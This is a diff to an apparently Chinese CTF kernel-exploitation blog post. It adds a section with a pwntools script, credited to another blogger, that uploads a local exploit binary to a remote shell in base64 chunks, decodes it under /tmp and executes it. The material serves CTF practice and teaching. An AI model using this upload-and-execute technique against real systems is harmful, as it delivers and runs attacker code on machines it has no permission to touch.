@@ -24,6 +24,7 @@ comments: true
   - [5.3 编写seccomp逃逸相关的代码](#53-编写seccomp逃逸相关的代码)
 - [特典: kernel pwn tricks:](#特典-kernel-pwn-tricks)
   - [特典一：qemu monitor模式](#特典一qemu-monitor模式)
+  - [特点二: kernel pwn远程传文件脚本](#特点二-kernel-pwn远程传文件脚本)
 
 
 # 1. kernel 环境搭建<br>
@@ -296,6 +297,41 @@ qemu-system-x86_64: Unable to write to command: Broken pipe
 
 [https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/)<br>
 
+
+## 特点二: kernel pwn远程传文件脚本<br>
+我直接超了这位佬的脚本.jpg<br>
+[https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA)<br>
+```python
+from pwn import *
+import base64
+#context.log_level = "debug"
+
+with open("./exp", "rb") as f:
+    exp = base64.b64encode(f.read())
+
+p = remote("127.0.0.1", 11451)
+#p = process('./run.sh')
+try_count = 1
+while True:
+    p.sendline()
+    p.recvuntil("/ $")
+
+    count = 0
+    for i in range(0, len(exp), 0x200):
+        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
+        count += 1
+        log.info("count: " + str(count))
+
+    for i in range(count):
+        p.recvuntil("/ $")
+    
+    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
+    p.sendline("chmod +x /tmp/exploit")
+    p.sendline("/tmp/exploit ")
+    break
+
+p.interactive()
+```
 
 
 <!-- Google tag (gtag.js) -->
